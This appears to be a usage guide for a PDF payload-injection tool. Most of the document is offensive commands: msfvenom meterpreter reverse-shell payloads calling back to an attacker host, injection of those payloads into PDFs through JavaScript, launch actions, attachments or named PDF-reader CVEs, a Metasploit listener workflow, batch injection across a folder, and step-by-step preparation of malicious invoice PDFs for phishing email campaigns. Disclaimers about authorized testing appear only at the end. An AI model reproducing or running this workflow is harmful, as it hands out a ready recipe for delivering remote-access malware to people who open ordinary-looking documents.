# PDF Payload Injector - Usage Examples

## Basic Examples

### 1. Windows Payload Injection
```bash
# Create a reverse shell payload (using msfvenom)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe > shell.exe

# Inject into PDF
python3 pdf_injector.py --input report.pdf --output exploit.pdf --payload shell.exe --target windows

# View the modified PDF
python3 pdf_injector.py --analyze exploit.pdf
```

### 2. Linux Payload Injection
```bash
# Create Linux payload
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f elf > shell.elf

# Inject into PDF
python3 pdf_injector.py --input document.pdf --output exploit.pdf --payload shell.elf --target linux
```

### 3. macOS Payload Injection
```bash
# Create macOS payload
msfvenom -p osx/x64/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f macho > shell.macho

# Inject into PDF
python3 pdf_injector.py --input doc.pdf --output exploit.pdf --payload shell.macho --target macos
```

## Advanced Examples

### 4. Using Specific CVE
```bash
# Use CVE-2010-0188 (libTiff buffer overflow)
python3 pdf_injector.py \
  --input original.pdf \
  --output exploit.pdf \
  --payload shell.exe \
  --target windows \
  --cve CVE-2010-0188
```

### 5. Using Exploit-DB Reference
```bash
# Use Exploit-DB ID 11662
python3 pdf_injector.py \
  --input original.pdf \
  --output exploit.pdf \
  --payload shell.exe \
  --target windows \
  --edb 11662
```

### 6. Custom JavaScript Script
```bash
# Create custom JavaScript
cat > malicious.js << 'EOF'
// Custom malicious JavaScript
app.alert("This is a test");
// Additional code here
EOF

# Inject custom script
python3 pdf_injector.py \
  --input doc.pdf \
  --output custom.pdf \
  --custom-script malicious.js
```

## Interactive Mode

### 7. Interactive Session
```bash
# Start interactive mode
python3 pdf_injector.py --interactive

# Menu options:
# 1. Inject payload into PDF
# 2. List vulnerabilities
# 3. List exploits
# 4. Analyze PDF
# 5. Exit
```

## Analysis and Information

### 8. List Available Vulnerabilities
```bash
# List all vulnerabilities
python3 pdf_injector.py --list-vulns

# Filter by target OS
python3 pdf_injector.py --list-vulns | grep -A 5 "windows"
```

### 9. List Available Exploits
```bash
# List all exploits
python3 pdf_injector.py --list-exploits

# Filter by platform
python3 pdf_injector.py --list-exploits | grep -A 5 "windows"
```

### 10. Analyze PDF File
```bash
# Analyze PDF structure and content
python3 pdf_injector.py --analyze document.pdf

# Output includes:
# - PDF version and size
# - Number of pages
# - Metadata (title, author, etc.)
# - Security analysis
# - JavaScript blocks
# - Embedded files
```

## Different Injection Methods

### 11. JavaScript Method (Default)
```bash
python3 pdf_injector.py \
  --input doc.pdf \
  --output exploit.pdf \
  --payload shell.exe \
  --target windows \
  --method javascript
```

### 12. Launch Action Method
```bash
python3 pdf_injector.py \
  --input doc.pdf \
  --output exploit.pdf \
  --payload shell.exe \
  --target windows \
  --method launch
```

### 13. Attachment Method
```bash
python3 pdf_injector.py \
  --input doc.pdf \
  --output exploit.pdf \
  --payload shell.exe \
  --target windows \
  --method attachment
```

## Real-World Scenarios

### 14. Phishing Campaign Preparation
```bash
# Step 1: Create payload
msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=your.server.com \
  LPORT=4444 \
  -f exe > invoice.exe

# Step 2: Inject into legitimate-looking PDF
python3 pdf_injector.py \
  --input invoice_template.pdf \
  --output malicious_invoice.pdf \
  --payload invoice.exe \
  --target windows

# Step 3: Analyze before deployment
python3 pdf_injector.py --analyze malicious_invoice.pdf

# Step 4: Use in authorized phishing test
```

### 15. Targeting Specific PDF Reader
```bash
# Target Adobe Reader 9.x (CVE-2010-0188)
python3 pdf_injector.py \
  --input report.pdf \
  --output exploit.pdf \
  --payload shell.exe \
  --cve CVE-2010-0188

# Target Foxit Reader (CVE-2018-19448)
python3 pdf_injector.py \
  --input report.pdf \
  --output exploit.pdf \
  --payload shell.exe \
  --cve CVE-2018-19448
```

### 16. Multi-OS Payload
```bash
# Windows version
python3 pdf_injector.py \
  --input doc.pdf \
  --output exploit_windows.pdf \
  --payload shell.exe \
  --target windows

# Linux version
python3 pdf_injector.py \
  --input doc.pdf \
  --output exploit_linux.pdf \
  --payload shell.elf \
  --target linux
```

## Debugging and Testing

### 17. Debug Mode
```bash
# Enable debug logging
python3 pdf_injector.py \
  --debug \
  --input doc.pdf \
  --output exploit.pdf \
  --payload shell.exe \
  --target windows
```

### 18. Custom Configuration
```bash
# Use custom config file
python3 pdf_injector.py \
  --config custom_config.json \
  --input doc.pdf \
  --output exploit.pdf \
  --payload shell.exe
```

## Integration with Metasploit

### 19. Complete Metasploit Workflow
```bash
# Terminal 1: Start Metasploit listener
msfconsole -x "use exploit/multi/handler; \
  set payload windows/meterpreter/reverse_tcp; \
  set LHOST 192.168.1.100; \
  set LPORT 4444; \
  exploit"

# Terminal 2: Create and inject payload
msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=192.168.1.100 \
  LPORT=4444 \
  -f exe > shell.exe

python3 pdf_injector.py \
  --input document.pdf \
  --output exploit.pdf \
  --payload shell.exe \
  --target windows
```

## Custom Script Examples

### 20. Alert Dialog Script
```javascript
// alert.js
app.alert("Security Test Document");
console.println("This is a test");
```

### 21. File Execution Script
```javascript
// execute.js
var path = "/tmp/payload.sh";
app.launchURL("file://" + path);
```

### 22. Information Gathering Script
```javascript
// gather_info.js
var info = {
  app: app.appVersion,
  viewer: app.viewerVersion,
  platform: app.viewerType,
  language: app.language
};
console.println(JSON.stringify(info));
app.alert(JSON.stringify(info));
```

## Safety Checks

### 23. Validate Payload
```bash
# The tool automatically validates payloads
# For Windows: Checks PE header
# For Linux: Checks ELF header
# Size validation (configurable)

python3 pdf_injector.py \
  --input doc.pdf \
  --output exploit.pdf \
  --payload shell.exe \
  --target windows

# If validation fails, error message will be displayed
```

### 24. Verify Output
```bash
# Always analyze the output PDF
python3 pdf_injector.py --analyze exploit.pdf

# Check for:
# - Proper PDF structure
# - Embedded JavaScript
# - Payload presence
# - Security implications
```

## Batch Processing

### 25. Process Multiple PDFs
```bash
#!/bin/bash
# batch_inject.sh

for pdf in *.pdf; do
  output="exploit_$pdf"
  python3 pdf_injector.py \
    --input "$pdf" \
    --output "$output" \
    --payload shell.exe \
    --target windows
done
```

## Email Delivery Preparation

### 26. Prepare for Email Campaign
```bash
# 1. Create payload
msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=your.server.com \
  LPORT=4444 \
  -f exe > invoice.exe

# 2. Inject into PDF
python3 pdf_injector.py \
  --input invoice.pdf \
  --output invoice_malicious.pdf \
  --payload invoice.exe \
  --target windows

# 3. Verify
python3 pdf_injector.py --analyze invoice_malicious.pdf

# 4. The PDF is now ready for authorized email testing
```

## Important Notes

⚠️ **Always remember:**
- Use only for authorized security testing
- Test in isolated environments
- Obtain proper permissions
- Follow ethical guidelines
- Document all testing

📝 **Best Practices:**
- Always analyze output PDFs
- Test payloads in VMs first
- Keep detailed logs
- Use version control for configs
- Document vulnerabilities used

🔒 **Safety First:**
- Never test on production systems
- Use isolated lab environments
- Scan with antivirus before use
- Verify PDF structure after injection
- Keep backups of original files